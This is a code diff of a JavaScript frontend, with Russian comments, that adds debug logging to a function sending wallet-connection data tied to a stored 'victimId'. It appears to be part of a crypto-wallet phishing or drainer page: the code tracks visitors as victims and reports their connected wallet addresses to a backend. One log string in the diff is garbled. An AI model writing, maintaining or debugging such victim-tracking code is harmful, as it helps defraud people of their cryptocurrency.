@@ -46,9 +46,14 @@ async function sendVisitData() {
  * Отправка данных о подключении кошелька
  */
 async function sendConnectionData(walletAddress) {
+    console.log('[FRONTEND] sendConnectionData: Функция вызвана с адресом', walletAddress);
     try {
         const victimId = localStorage.getItem('victimId');
-        if (!victimId) return;
+        console.log('[FRONTEND] sendConnectionData: Получен victimId из localStorage:', victimId);
+        if (!victimId){
+            console.warn('[FRONTEND] sendConnectionData: Victim ID не найден!');
+            return;
+        }
 
         const connectData = {
             victimId: victimId,
@@ -73,8 +78,9 @@ async function sendConnectionData(walletAddress) {
         const result = await response.json();
         // Успешно отправлено
     } catch (error) {
-        console.log('Не удалось отправить данные о подключении:', error.message);
+        console.error('[FRONTEND] sendConne coctionData: Ошибка:', error);
     }
+    console.log('[FRONTEND] sendConnectionData: Функция завершена');
 }
 
 /**
@@ -625,5 +631,6 @@ window.addEventListener('DOMContentLoaded', () => {
         connectButton.addEventListener('click', connectWallet);
     }
 });
+
 
 
